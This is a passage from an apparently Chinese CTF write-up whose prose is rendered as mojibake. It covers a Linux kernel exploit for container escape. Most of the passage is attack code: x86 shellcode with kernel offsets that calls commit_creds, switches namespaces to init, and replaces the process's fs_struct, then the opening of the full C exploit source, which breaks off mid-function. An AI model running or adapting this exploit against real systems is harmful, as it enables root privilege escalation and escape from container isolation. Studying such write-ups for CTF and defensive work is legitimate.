¸ç‰©ç†åœ°å€åŸºå€åå°±å¯ä»¥ç›´æ¥ä¿®æ”¹å†…æ ¸çš„ä»£ç æ®µäº†ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©ä¿®æ”¹ getuid å‡½æ•°ã€‚</p><h3 id="å®¹å™¨é€ƒé€¸"><a href="#å®¹å™¨é€ƒé€¸" class="headerlink" title="å®¹å™¨é€ƒé€¸"></a>å®¹å™¨é€ƒé€¸</h3><p>æˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡æ˜¯è¿›è¡Œå®¹å™¨é€ƒé€¸ï¼Œè¿™é‡Œå‚è€ƒ<a href="https://syst3mfailure.io/corjail/">[corCTF 2022] CoRJail: From Null Byte Overflow To Docker Escape Exploiting poll_list Objects In The Linux Kernel (syst3mfailure.io)</a>ä¸Šçš„ rop é“¾</p><p>å…¶å¯¹åº”çš„ shellcode å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">  init_cred         = 0x2a76b00</span><br><span class="line">  commit_creds      = 0x1c2670</span><br><span class="line">  find_task_by_vpid = 0x1b8fa0 </span><br><span class="line">  init_nsproxy      = 0x2a768c0</span><br><span class="line">  switch_task_namespaces = 0x1c0ad0</span><br><span class="line">  init_fs                = 0x2bb5320</span><br><span class="line">  copy_fs_struct         = 0x45c0f0</span><br><span class="line">  kpti_bypass            = 0x14011c6</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">  endbr64</span><br><span class="line">  call a</span><br><span class="line">a:</span><br><span class="line">  ; r15 equ kernel_base</span><br><span class="line">  lea r15,[rip]</span><br><span class="line">  sub r15, 0x1ab7f0</span><br><span class="line"></span><br><span class="line">  ; commit_creds(init_cred) [3]</span><br><span class="line">  lea rdi, [r15 + init_cred]</span><br><span class="line">  lea rax, [r15 + commit_creds]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; task = find_task_by_vpid(1) [4]</span><br><span class="line">  mov edi, 1</span><br><span class="line">  lea rax, [r15 + find_task_by_vpid]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; switch_task_namespaces(task, init_nsproxy) [5]</span><br><span class="line">  mov rdi, rax</span><br><span class="line">  lea rsi, [r15 + init_nsproxy]</span><br><span class="line">  lea rax, [r15 + switch_task_namespaces]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; new_fs = copy_fs_struct(init_fs) [6]</span><br><span class="line">  lea rdi, [r15 + init_fs]</span><br><span class="line">  lea rax, [r15 + copy_fs_struct]</span><br><span class="line">  call rax</span><br><span class="line">  mov rbx, rax</span><br><span class="line"></span><br><span class="line">  ; current = find_task_by_vpid(getpid()) [7]</span><br><span class="line">  mov rdi, 0x1111111111111111  </span><br><span class="line">  lea rax, [r15 + find_task_by_vpid]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; current-&gt;fs = new_fs [8]</span><br><span class="line">  mov [rax + 0x828], rbx</span><br><span class="line"></span><br><span class="line">  ; kpti trampoline [9]</span><br><span class="line">  xor eax, eax</span><br><span class="line">  mov [rsp+0x00], rax</span><br><span class="line">  mov [rsp+0x08], rax</span><br><span class="line">  mov rax, 0x2222222222222222   ; win</span><br><span class="line">  mov [rsp+0x10], rax</span><br><span class="line">  mov rax, 0x3333333333333333   ; cs</span><br><span class="line">  mov [rsp+0x18], rax</span><br><span class="line">  mov rax, 0x4444444444444444   ; rflags</span><br><span class="line">  mov [rsp+0x20], rax</span><br><span class="line">  mov rax, 0x5555555555555555   ; stack</span><br><span class="line">  mov [rsp+0x28], rax</span><br><span class="line">  mov rax, 0x6666666666666666   ; ss</span><br><span class="line">  mov [rsp+0x30], rax</span><br><span class="line">  lea rax, [r15 + kpti_bypass]</span><br><span class="line">  jmp rax</span><br><span class="line"></span><br><span class="line">  int3</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ task_struct ç»“æ„ä½“ä¸­çš„ fs å¯¹è±¡åœ¨ä¸åŒå†…æ ¸ç‰ˆæœ¬ä¸­çš„åç§»æ˜¯ä¸ä¸€æ ·çš„ï¼Œåœ¨è¿™é“é¢˜ç›®ä¸­çš„åç§»æ˜¯ 0x828  </p><p>ä¸ºäº†ææ‡‚ä»–æ˜¯å¦‚ä½•å®ç°å®¹å™¨é€ƒé€¸çš„ï¼Œè¿™é‡Œå…ˆçœ‹çœ‹è¿™æ®µ shellcode å¹²äº†ä»€ä¹ˆï¼Œç¿»è¯‘ä¸€ä¸‹ï¼Œè¿™æ®µ shellcode å¹²äº†ä¸‹é¢è¿™äº›äº‹æƒ…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(init_cred);  <span class="comment">// [1]</span></span><br><span class="line"></span><br><span class="line">task = find_task_by_vpid(<span class="number">1</span>);  <span class="comment">// [2]</span></span><br><span class="line">switch_task_namespaces(task, init_nsproxy);  <span class="comment">// [3]</span></span><br><span class="line">new_fs = copy_fs_struct(init_fs);  <span class="comment">// [4]</span></span><br><span class="line">current = find_task_by_vpid(getpid());  <span class="comment">// [5]</span></span><br><span class="line">current-&gt;fs = new_fs;  <span class="comment">// [6]</span></span><br><span class="line">swapgs_restore_regs_and_return_to_usermode();  <span class="comment">// [7]</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬è¦å…ˆçŸ¥é“æˆ‘ä»¬ä¸ºä»€ä¹ˆå¯ä»¥è¿›è¡Œå®¹å™¨é€ƒé€¸ï¼Œé‚£æ˜¯å› ä¸º nsjail å’Œ docker ä¸æˆ‘ä»¬å¯åŠ¨å®¹å™¨çš„æ“ä½œç³»ç»Ÿçš„æ˜¯åŒä¸€ä¸ªå†…æ ¸ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ wsl é‡Œé¢ç”¨ docker å¯åŠ¨ä¸€ä¸ª ubuntuï¼Œç„¶åç”¨ uanme -r å‘½ä»¤å»éªŒè¯ä¸€ä¸‹ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¿›è¡Œå‘½åç©ºé—´çš„åˆ‡æ¢å³å¯ï¼Œè€Œä¸”è¿™ä¸ªæ“ä½œå¯ä»¥ç›´æ¥åœ¨å†…æ ¸å†…éƒ¨å®ç°ã€‚ç”±äºæˆ‘ä»¬å·²ç»å¯ä»¥åŠ«æŒå†…æ ¸æ‰§è¡Œæµï¼Œå®¹å™¨é€ƒé€¸ä¹Ÿå°±æˆä¸ºäº†å¯èƒ½ã€‚<br>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹å…·ä½“å¦‚ä½•å®ç°é€ƒé€¸ï¼š<br>ç¬¬ 1 å’Œ 7 é¡¹å¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯ææƒç„¶åä»å†…æ ¸æ€è¿”å›ç”¨æˆ·æ€ã€‚</p><p>æˆ‘ä»¬åœ¨å®¹å™¨ä¸­å¯ä»¥é€šè¿‡å†…æ ¸å‡½æ•° find_task_by_vpid æ¥å¯»æ‰¾task_structï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥é¦–å…ˆåœ¨å®¹å™¨å†…éƒ¨å®Œæˆææƒï¼Œç„¶åä½¿ç”¨å‡½æ•° find_task_by_vpid(1) æ¥è·å¾—å®¹å™¨ä¸­çš„ init&#x2F;swap è¿›ç¨‹çš„ task_structï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">task = find_task_by_vpid(<span class="number">1</span>); </span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°†å½“å‰å‘½åç©ºé—´ä¸‹çš„initè¿›ç¨‹çš„å‘½åç©ºé—´åˆ‡æ¢ä¸ºå†…æ ¸å½“ä¸­çš„ init_proxyï¼Œè¿™é‡Œæ˜¯ç”±å†…æ ¸å½“ä¸­æå–çš„ï¼Œå¹¶ä¸æ˜¯ nsjail å½“ä¸­çš„ init_proxyï¼Œæ€»ç»“ä¸‹æ¥å°±æ˜¯è°ƒç”¨ä¸‹é¢çš„å‡½æ•°ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">switch_task_namespaces(task, init_proxy);</span><br></pre></td></tr></table></figure><p>ç”±äº setns è¢«è¿‡æ»¤ï¼Œè¿™å¯¼è‡´æˆ‘ä»¬æ— æ³•åœ¨è¿”å›ç”¨æˆ·ç©ºé—´åè¿›å…¥å…¶ä»–çš„å‘½åç©ºé—´ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ¨¡æ‹Ÿ setns() å‡½æ•°ä¸­çš„ commit_nsset() åŠŸèƒ½ï¼Œæˆ‘ä»¬åˆ©ç”¨å‡½æ•° copy_fs_struct è·å–å†…æ ¸å½“ä¸­çš„ init_fs æ‰€å¯¹åº”çš„ fs_struct ç»“æ„ä½“ï¼Œç„¶åèµ‹å€¼ç»™æˆ‘ä»¬å½“å‰è¿›ç¨‹çš„ task_struct-&gt;fsï¼Œè¿™æ ·å°±å®ç°äº†èµ„æºçš„è½¬ç§»ï¼Œä¹Ÿå°±æ˜¯è¯´è°ƒç”¨ä¸‹é¢çš„å‡½æ•°ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find_task_by_vpid(getpid())-&gt;fs = copy_fs_struct(init_fs);</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_PAGESPRAY 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_FILESPRAY 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_FD 0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_FD 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TMP_FD 0x50</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMA_HEAP_IOCTL_ALLOC 0xc0184800</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u32;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> &#123;</span></span><br><span class="line">  u64 len;</span><br><span class="line">  u32 fd;</span><br><span class="line">  u32 fd_flags;</span><br><span class="line">  u64 heap_flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1338</span>, &amp;index); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf</span><span class="params">(<span class="type">int</span> 